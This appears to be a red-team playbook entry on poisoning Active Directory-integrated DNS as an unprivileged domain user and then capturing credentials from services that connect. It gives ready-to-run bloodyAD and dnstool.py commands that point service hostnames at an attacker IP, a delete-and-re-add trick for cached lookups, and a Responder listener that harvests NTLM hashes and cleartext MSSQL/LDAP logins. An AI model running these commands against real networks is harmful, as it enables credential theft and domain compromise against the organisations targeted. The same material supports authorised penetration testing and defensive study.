# AD DNS Record Poisoning + Rogue Service Capture

## When this applies

- Any authenticated domain user (no special privileges required).
- AD-integrated DNS zones — every domain user can add new records by default.
- Goal: redirect a service hostname (MSSQL linked server target, WSUS, syslog, etc.) to an attacker IP, capture the auth on connection.

## Technique

AD-integrated DNS allows any authenticated user to create A records (CREATE-CHILD on zone). Point an unresolvable / future hostname at your IP, run a fake service matching the protocol, capture connecting credentials.

## Steps

```bash
# Any domain user can add A records to AD-integrated DNS zones
# Useful when MSSQL linked servers, WSUS upstream, or services point to unresolvable hostnames
bloodyAD -d domain.local -u user -p pass --host DC_IP add dnsRecord <hostname> <attacker_IP>
# Or using dnstool.py from krbrelayx:
python3 dnstool.py -u 'DOMAIN\user' -p 'pass' -a add -r '<hostname>.domain.local' -d <attacker_IP> DC_IP
# Wait 30-60s for propagation, verify with: nslookup <hostname>.domain.local DC_IP
# If NXDOMAIN persists after LDAP add succeeds: delete (tombstone) then re-add:
python3 dnstool.py -u 'DOMAIN\user' -p 'pass' -a remove -r '<hostname>.domain.local' -d <old_IP> DC_IP
python3 dnstool.py -u 'DOMAIN\user' -p 'pass' -a add -r '<hostname>.domain.local' -d <attacker_IP> DC_IP
# The delete+re-add cycle forces DNS zone reload and clears cached NXDOMAIN
```

## Rogue Service Credential Capture (after DNS poisoning or MITM)

```bash
# Set up listeners for credential capture when services connect to your IP
# MSSQL TDS: SQL auth sends cleartext user + XOR-obfuscated password in Login7 packet
# LDAP: simple bind sends cleartext credentials
# HTTP NTLM: capture NTLMv2 hashes for offline cracking
# Multi-protocol: responder -I eth0 -wrf
# Trigger: MSSQL linked server query, scheduled task, service dependency
```

## Verifying success

- `nslookup <hostname>.domain.local DC_IP` resolves to the attacker IP.
- On service connect, listener captures cleartext (TDS/LDAP) or hash (NTLM) credentials.

## Common pitfalls

- DNS NXDOMAIN may be cached. Use the delete+re-add cycle.
- For services using Kerberos auth, simple DNS poisoning won't yield NTLM hashes — trigger a fall-back path or use unconstrained-delegation-receiver setups.
- Look for AD DNS poisoning in combination with WSUS MITM (see `wsus-mitm.md`) and silver tickets for full chains.

## Tools

- bloodyAD
- dnstool.py (krbrelayx)
- responder (multi-protocol)
- impacket `mssqlserver.py`
